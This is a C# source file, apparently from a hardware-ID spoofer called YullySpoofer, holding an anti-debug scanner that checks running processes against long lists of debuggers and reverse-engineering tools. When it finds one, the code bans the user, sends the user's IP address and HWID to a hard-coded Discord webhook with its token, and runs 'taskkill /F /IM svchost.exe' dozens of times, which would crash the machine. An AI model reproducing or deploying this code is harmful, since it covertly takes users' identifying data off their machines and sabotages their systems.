using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using YullySpoofer;

namespace Anti_DebugNET.AntiDebugTools;

internal class Scanner
{
	private static HashSet<string> BadProcessnameList = new HashSet<string>();

	private static HashSet<string> BadWindowTextList = new HashSet<string>();

	public static void ScanAndKill()
	{
		if (Scan(KillProcess: true) != 0)
		{
		}
	}

	private static int Scan(bool KillProcess)
	{
		int result = 0;
		if (BadProcessnameList.Count == 0 && BadWindowTextList.Count == 0)
		{
			Init();
		}
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (!BadProcessnameList.Contains(process.ProcessName) && !BadWindowTextList.Contains(process.MainWindowTitle))
			{
				continue;
			}
			Console.ForegroundColor = ConsoleColor.Red;
			Console.Write("Please Close this Progrmam: " + process.ProcessName);
			result = 1;
			if (!KillProcess)
			{
				break;
			}
			try
			{
				process.Kill();
				using DcWebHook dcWebHook = new DcWebHook();
				Program.KeyAuthApp.ban();
				dcWebHook.UserName = "[ALERT]";
				dcWebHook.WebHook = "https://discord.com/api/webhooks/1010327171870498827/8iTWAVHfR6wSLxHhbL9CiUTJBSB7FwWCBQ6VMHg6S7HIFOT-0VdUxH4tCLqwffAua9Rx";
				dcWebHook.SendMessage("<@853211961575079938>" + Environment.NewLine + "css" + Environment.NewLine + "[ALERT | A GUY HAS TRYED TO CRACK THE SPOOFER]" + Environment.NewLine + "IP | " + IP.Grab() + Environment.NewLine + "HWID | " + HWID.Grab() + Environment.NewLine + Environment.NewLine + "Username | " + Environment.NewLine + "Password | " + Environment.NewLine);
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Program.KeyAuthApp.ban();
			}
			catch (Win32Exception ex)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.Write("Win32Exception: " + ex.Message);
				using DcWebHook dcWebHook2 = new DcWebHook();
				Program.KeyAuthApp.ban();
				dcWebHook2.UserName = "[ALERT]";
				dcWebHook2.WebHook = "https://discord.com/api/webhooks/1010327171870498827/8iTWAVHfR6wSLxHhbL9CiUTJBSB7FwWCBQ6VMHg6S7HIFOT-0VdUxH4tCLqwffAua9Rx";
				dcWebHook2.SendMessage("<@853211961575079938>" + Environment.NewLine + "css" + Environment.NewLine + "[ALERT | A GUY HAS TRYED TO CRACK THE SPOOFER]" + Environment.NewLine + "IP | " + IP.Grab() + Environment.NewLine + "HWID | " + HWID.Grab() + Environment.NewLine + Environment.NewLine + "Username | " + Environment.NewLine + "Password | " + Environment.NewLine);
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
			}
			catch (NotSupportedException ex2)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.Write("NotSupportedException: " + ex2.Message);
				using DcWebHook dcWebHook3 = new DcWebHook();
				Program.KeyAuthApp.ban();
				dcWebHook3.UserName = "[ALERT]";
				dcWebHook3.WebHook = "https://discord.com/api/webhooks/1010327171870498827/8iTWAVHfR6wSLxHhbL9CiUTJBSB7FwWCBQ6VMHg6S7HIFOT-0VdUxH4tCLqwffAua9Rx";
				dcWebHook3.SendMessage("<@853211961575079938>" + Environment.NewLine + "css" + Environment.NewLine + "[ALERT | A GUY HAS TRYED TO CRACK THE SPOOFER]" + Environment.NewLine + "IP | " + IP.Grab() + Environment.NewLine + "HWID | " + HWID.Grab() + Environment.NewLine + Environment.NewLine + "Username | " + Environment.NewLine + "Password | " + Environment.NewLine);
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
			}
			catch (InvalidOperationException ex3)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.Write("InvalidOperationException: " + ex3.Message);
				using DcWebHook dcWebHook4 = new DcWebHook();
				Program.KeyAuthApp.ban();
				dcWebHook4.UserName = "[ALERT]";
				dcWebHook4.WebHook = "https://discord.com/api/webhooks/1010327171870498827/8iTWAVHfR6wSLxHhbL9CiUTJBSB7FwWCBQ6VMHg6S7HIFOT-0VdUxH4tCLqwffAua9Rx";
				dcWebHook4.SendMessage("<@853211961575079938>" + Environment.NewLine + "css" + Environment.NewLine + "[ALERT | A GUY HAS TRYED TO CRACK THE SPOOFER]" + Environment.NewLine + "IP | " + IP.Grab() + Environment.NewLine + "HWID | " + HWID.Grab() + Environment.NewLine + Environment.NewLine + "Username | " + Environment.NewLine + "Password | " + Environment.NewLine);
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
				Process.Start("taskkill", "/F /IM svchost.exe");
			}
			break;
		}
		return result;
	}

	private static int Init()
	{
		if (BadProcessnameList.Count > 0 && BadWindowTextList.Count > 0)
		{
			return 1;
		}
		BadProcessnameList.Add("ollydbg");
		BadProcessnameList.Add("ida");
		BadProcessnameList.Add("ida64");
		BadProcessnameList.Add("idag");
		BadProcessnameList.Add("idag64");
		BadProcessnameList.Add("idaw");
		BadProcessnameList.Add("idaw64");
		BadProcessnameList.Add("idaq");
		BadProcessnameList.Add("idaq64");
		BadProcessnameList.Add("idau");
		BadProcessnameList.Add("idau64");
		BadProcessnameList.Add("scylla");
		BadProcessnameList.Add("scylla_x64");
		BadProcessnameList.Add("scylla_x86");
		BadProcessnameList.Add("protection_id");
		BadProcessnameList.Add("x64dbg");
		BadProcessnameList.Add("x32dbg");
		BadProcessnameList.Add("windbg");
		BadProcessnameList.Add("reshacker");
		BadProcessnameList.Add("ImportREC");
		BadProcessnameList.Add("IMMUNITYDEBUGGER");
		BadProcessnameList.Add("MegaDumper");
		BadProcessnameList.Add("KsDumperClient");
		BadProcessnameList.Add("KsDumper");
		BadProcessnameList.Add("Wireshark");
		BadProcessnameList.Add("Fiddler");
		BadProcessnameList.Add("FiddlerEverywhere");
		BadProcessnameList.Add("Xenos64");
		BadProcessnameList.Add("Xenos");
		BadProcessnameList.Add("Xenos32");
		BadProcessnameList.Add("de4dot");
		BadProcessnameList.Add("FreeTools.ioFolderViewer");
		BadProcessnameList.Add("cheatengine-x86_64");
		BadProcessnameList.Add("cheatengine-x86_64-SSE4-AVX2");
		BadProcessnameList.Add("Cheat Engine");
		BadProcessnameList.Add("MugenJinFuu-x86_64-SSE4-AVX2");
		BadProcessnameList.Add("MugenJinFuu-i386");
		BadProcessnameList.Add("cheatengine-x86_64");
		BadProcessnameList.Add("cheatengine-i386");
		BadProcessnameList.Add("ProcessHacker");
		BadProcessnameList.Add("ProcessHacker 2");
		BadProcessnameList.Add("ProcessHacker 1");
		BadProcessnameList.Add("VB Decompiler");
		BadProcessnameList.Add("pexplorer");
		BadProcessnameList.Add("HDasm");
		BadProcessnameList.Add("SourceRescuer");
		BadProcessnameList.Add("dnSpy");
		BadProcessnameList.Add("dnSpy-x86");
		BadProcessnameList.Add("DeDe");
		BadProcessnameList.Add("DotNetResolver");
		BadProcessnameList.Add("Reflector");
		BadProcessnameList.Add("P32Dasm");
		BadProcessnameList.Add("kWdsm");
		BadProcessnameList.Add("VBExplorer v1.1");
		BadProcessnameList.Add("VB.Decompiler.Pro.v10.0.KEYGEN-FFF");
		BadProcessnameList.Add("krzloaddll");
		BadProcessnameList.Add("krzydbg");
		BadProcessnameList.Add("4fr33");
		BadProcessnameList.Add("StringDecryptor");
		BadProcessnameList.Add("ExtremeDumper");
		BadProcessnameList.Add("KDT");
		BadProcessnameList.Add("AntiTamperKiller");
		BadProcessnameList.Add("AntiTampRem");
		BadProcessnameList.Add("CFF Explorer");
		BadProcessnameList.Add("PE-bear");
		BadProcessnameList.Add("HxD32");
		BadProcessnameList.Add("HxD64");
		BadProcessnameList.Add("BConv32");
		BadProcessnameList.Add("Tutorial");
		BadProcessnameList.Add("dbpwd");
		BadProcessnameList.Add("accesspv");
		BadProcessnameList.Add("WinSpy32");
		BadProcessnameList.Add("WinSpy64");
		BadProcessnameList.Add("WinSpy 1.8.9 beta");
		BadProcessnameList.Add("Au3Info_x32");
		BadProcessnameList.Add("Au3Info_x64");
		BadProcessnameList.Add("hdd");
		BadProcessnameList.Add("Procmon");
		BadProcessnameList.Add("Procmon64");
		BadProcessnameList.Add("USSF");
		BadProcessnameList.Add("DnsJumper");
		BadProcessnameList.Add("CryptoTester");
		BadProcessnameList.Add("ConverterNET x64");
		BadProcessnameList.Add("CABPACK");
		BadProcessnameList.Add("HostsEditor");
		BadProcessnameList.Add("HideToolz");
		BadProcessnameList.Add("ASPatcher1.2");
		BadProcessnameList.Add("dup2");
		BadProcessnameList.Add("alg");
		BadProcessnameList.Add("abel_loader_generator");
		BadProcessnameList.Add("Sniffer Maker");
		BadProcessnameList.Add("Loader.Generator.v1.3");
		BadProcessnameList.Add("exeinfope");
		BadProcessnameList.Add("EXEconfig");
		BadProcessnameList.Add("nfd");
		BadProcessnameList.Add("Protection_ID");
		BadProcessnameList.Add("RDG Packer Detector v0.7.6");
		BadProcessnameList.Add("Unpacker_PECompact");
		BadProcessnameList.Add("Unpecomp2");
		BadProcessnameList.Add("WSUnpacker");
		BadProcessnameList.Add("xvlk");
		BadProcessnameList.Add("UPXUnPacKer.V0.3.By.skylly");
		BadProcessnameList.Add("UPXEasyGUI");
		BadProcessnameList.Add("upx_unpacker");
		BadProcessnameList.Add("UntElock 0.98+");
		BadProcessnameList.Add("RlpackUnpacker");
		BadProcessnameList.Add("ObsidiumUnpacker");
		BadProcessnameList.Add("MART!K UnPacker");
		BadProcessnameList.Add("NoFuserEx");
		BadProcessnameList.Add("NoFuser");
		BadProcessnameList.Add("NetGuard Deobfuscator 2");
		BadProcessnameList.Add("sample_x86");
		BadProcessnameList.Add("ILPUnpacker");
		BadProcessnameList.Add("ConfuserEx Dynamic Unpacker");
		BadProcessnameList.Add("UnConfuserEx");
		BadProcessnameList.Add("ResourceHacker");
		BadProcessnameList.Add("apkeasytool");
		BadProcessnameList.Add("apkeasytool-x64");
		BadProcessnameList.Add("jadx-gui-0.9.0");
		BadProcessnameList.Add("luyten-0.5.4");
		BadProcessnameList.Add("Smali Helper v2.0");
		BadProcessnameList.Add("rej_byyildo");
		BadProcessnameList.Add("launch4j");
		BadProcessnameList.Add("jd-gui");
		BadProcessnameList.Add("ConfuserEx AntiDump Fixer");
		BadProcessnameList.Add("Kripto Türk v1.0 Deobfuscator");
		BadProcessnameList.Add("Universal_Fixer");
		BadProcessnameList.Add("Universal_Fixer_NoFuser3");
		BadProcessnameList.Add("Overlay Tool 1.0");
		BadProcessnameList.Add("Sec_Add");
		BadProcessnameList.Add("Extreme Injector v3");
		BadProcessnameList.Add("vsd_win32");
		BadProcessnameList.Add("ImportREC");
		BadProcessnameList.Add("Imports Fixer");
		BadProcessnameList.Add("ARTeamImportReconstructor");
		BadProcessnameList.Add("Stud_PE");
		BadProcessnameList.Add("updatevsd");
		BadProcessnameList.Add("WebCruiserWVS");
		BadProcessnameList.Add("0x22 Loader");
		BadProcessnameList.Add("navicat");
		BadProcessnameList.Add("Havij_Load");
		BadProcessnameList.Add("Havij");
		BadProcessnameList.Add("Charles");
		BadProcessnameList.Add("diocane");
		BadProcessnameList.Add("FolderViewerud");
		BadProcessnameList.Add("Folderviewchanges");
		BadProcessnameList.Add("FreeTools.ioDriverPuller");
		BadWindowTextList.Add("HTTPDebuggerUI");
		BadWindowTextList.Add("FreeTools.ioDriverPuller");
		BadWindowTextList.Add("Folderviewchanges");
		BadWindowTextList.Add("FolderViewerud");
		BadWindowTextList.Add("diocane");
		BadWindowTextList.Add("Charles");
		BadWindowTextList.Add("Havij_Load");
		BadWindowTextList.Add("Havij");
		BadWindowTextList.Add("navicat");
		BadWindowTextList.Add("0x22 Loader");
		BadWindowTextList.Add("WebCruiserWVS");
		BadWindowTextList.Add("updatevsd");
		BadWindowTextList.Add("Stud_PE");
		BadWindowTextList.Add("ARTeamImportReconstructor");
		BadWindowTextList.Add("Imports Fixer");
		BadWindowTextList.Add("ImportREC");
		BadWindowTextList.Add("vsd_win32");
		BadWindowTextList.Add("Extreme Injector v3");
		BadWindowTextList.Add("Sec_Add");
		BadWindowTextList.Add("Overlay Tool 1.0");
		BadWindowTextList.Add("Universal_Fixer_NoFuser3");
		BadWindowTextList.Add("Universal_Fixer");
		BadWindowTextList.Add("Kripto Türk v1.0 Deobfuscator");
		BadWindowTextList.Add("ConfuserEx AntiDump Fixer");
		BadWindowTextList.Add("jd-gui");
		BadWindowTextList.Add("launch4j");
		BadWindowTextList.Add("rej_byyildo");
		BadWindowTextList.Add("Smali Helper v2.0");
		BadWindowTextList.Add("luyten-0.5.4");
		BadWindowTextList.Add("jadx-gui-0.9.0");
		BadWindowTextList.Add("apkeasytool-x64");
		BadWindowTextList.Add("apkeasytool");
		BadWindowTextList.Add("ResourceHacker");
		BadWindowTextList.Add("UnConfuserEx");
		BadWindowTextList.Add("ConfuserEx Dynamic Unpacker");
		BadWindowTextList.Add("ILPUnpacker");
		BadWindowTextList.Add("sample_x86");
		BadWindowTextList.Add("NetGuard Deobfuscator 2");
		BadWindowTextList.Add("NoFuser");
		BadWindowTextList.Add("NoFuserEx");
		BadWindowTextList.Add("MART!K UnPacker");
		BadWindowTextList.Add("ObsidiumUnpacker");
		BadWindowTextList.Add("RlpackUnpacker");
		BadWindowTextList.Add("UntElock 0.98+");
		BadWindowTextList.Add("upx_unpacker");
		BadWindowTextList.Add("UPXEasyGUI");
		BadWindowTextList.Add("UPXUnPacKer.V0.3.By.skylly");
		BadWindowTextList.Add("xvlk");
		BadWindowTextList.Add("WSUnpacker");
		BadWindowTextList.Add("Unpecomp2");
		BadWindowTextList.Add("Unpacker_PECompact");
		BadWindowTextList.Add("RDG Packer Detector v0.7.6");
		BadWindowTextList.Add("Protection_ID");
		BadWindowTextList.Add("nfd");
		BadWindowTextList.Add("EXEconfig");
		BadWindowTextList.Add("exeinfope");
		BadWindowTextList.Add("Loader.Generator.v1.3");
		BadWindowTextList.Add("Sniffer Maker");
		BadWindowTextList.Add("abel_loader_generator");
		BadWindowTextList.Add("alg");
		BadWindowTextList.Add("dup2");
		BadWindowTextList.Add("ASPatcher1.2");
		BadWindowTextList.Add("HideToolz");
		BadWindowTextList.Add("HostsEditor");
		BadWindowTextList.Add("CABPACK");
		BadWindowTextList.Add("ConverterNET x86");
		BadWindowTextList.Add("CryptoTester");
		BadWindowTextList.Add("DnsJumper");
		BadWindowTextList.Add("USSF");
		BadWindowTextList.Add("Procmon64");
		BadWindowTextList.Add("Procmon");
		BadWindowTextList.Add("hdd");
		BadWindowTextList.Add("Au3Info_x64");
		BadWindowTextList.Add("Au3Info_x32");
		BadWindowTextList.Add("WinSpy 1.8.9 beta");
		BadWindowTextList.Add("WinSpy64");
		BadWindowTextList.Add("WinSpy32");
		BadWindowTextList.Add("accesspv");
		BadWindowTextList.Add("dbpwd");
		BadWindowTextList.Add("Tutorial");
		BadWindowTextList.Add("BConv32");
		BadWindowTextList.Add("HxD64");
		BadWindowTextList.Add("HxD32");
		BadWindowTextList.Add("PE-bear");
		BadWindowTextList.Add("CFF Explorer");
		BadWindowTextList.Add("AntiTampRem");
		BadWindowTextList.Add("AntiTamperKiller");
		BadWindowTextList.Add("KDT");
		BadWindowTextList.Add("ExtremeDumper");
		BadWindowTextList.Add("StringDecryptor");
		BadWindowTextList.Add("4fr33");
		BadWindowTextList.Add("krzydbg");
		BadWindowTextList.Add("krzloaddll");
		BadWindowTextList.Add("VB.Decompiler.Pro.v10.0.KEYGEN-FFF");
		BadWindowTextList.Add("VBExplorer v1.1");
		BadWindowTextList.Add("kWdsm");
		BadWindowTextList.Add("P32Dasm");
		BadWindowTextList.Add("Reflector");
		BadWindowTextList.Add("DotNetResolver");
		BadWindowTextList.Add("DeDe");
		BadWindowTextList.Add("dnSpy");
		BadWindowTextList.Add("dnSpy-x86");
		BadWindowTextList.Add("SourceRescuer");
		BadWindowTextList.Add("HDasm");
		BadWindowTextList.Add("pexplorer");
		BadWindowTextList.Add("VB Decompiler");
		BadWindowTextList.Add("HTTPDebuggerSvc");
		BadWindowTextList.Add("HTTP Debugger");
		BadWindowTextList.Add("HTTP Debugger (32 bit)");
		BadWindowTextList.Add("HTTP Debugger (64 bit)");
		BadWindowTextList.Add("OLLYDBG");
		BadWindowTextList.Add("ida");
		BadWindowTextList.Add("disassembly");
		BadWindowTextList.Add("scylla");
		BadWindowTextList.Add("Debug");
		BadWindowTextList.Add("[CPU");
		BadWindowTextList.Add("Immunity");
		BadWindowTextList.Add("WinDbg");
		BadWindowTextList.Add("x32dbg");
		BadWindowTextList.Add("x64dbg");
		BadWindowTextList.Add("Import reconstructor");
		BadWindowTextList.Add("MegaDumper");
		BadWindowTextList.Add("MegaDumper 1.0 by CodeCracker / SnD");
		BadWindowTextList.Add("KsDumperClient");
		BadWindowTextList.Add("KsDumper");
		BadWindowTextList.Add("Wireshark");
		BadWindowTextList.Add("Fiddler");
		BadWindowTextList.Add("FiddlerEverywhere");
		BadWindowTextList.Add("Xenos64");
		BadWindowTextList.Add("Xenos");
		BadWindowTextList.Add("Xenos32");
		BadWindowTextList.Add("de4dot");
		BadWindowTextList.Add("cheatengine-x86_64");
		BadWindowTextList.Add("cheatengine-x86_64-SSE4-AVX2");
		BadWindowTextList.Add("Cheat Engine");
		BadWindowTextList.Add("MugenJinFuu-x86_64-SSE4-AVX2");
		BadWindowTextList.Add("MugenJinFuu-i386");
		BadWindowTextList.Add("cheatengine-x86_64");
		BadWindowTextList.Add("cheatengine-i386");
		BadWindowTextList.Add("ProcessHacker");
		BadWindowTextList.Add("ProcessHacker 1");
		BadWindowTextList.Add("ProcessHacker 2");
		BadWindowTextList.Add("die");
		return 0;
	}
}
